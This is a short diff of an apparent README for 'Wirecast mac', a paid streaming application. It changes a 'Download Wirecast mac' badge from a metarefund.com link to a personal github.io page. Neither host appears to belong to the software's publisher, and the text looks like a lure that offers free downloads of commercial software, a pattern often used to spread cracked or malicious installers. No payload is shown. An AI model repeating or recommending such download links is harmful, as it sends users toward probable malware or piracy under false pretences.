@@ -2,7 +2,7 @@
 
 Wirecast mac delivers Mac‑optimized tools with Apple silicon support, native UI, and professional workflows.
 
-[![Download Wirecast mac](https://img.shields.io/badge/Download-Wirecast_mac-blueviolet)](https://metarefund.com/)
+[![Download Wirecast mac](https://img.shields.io/badge/Download-Wirecast_mac-blueviolet)](https://pauliinabisker.github.io/.github/Wirecast-Studio)
 
 ---
 
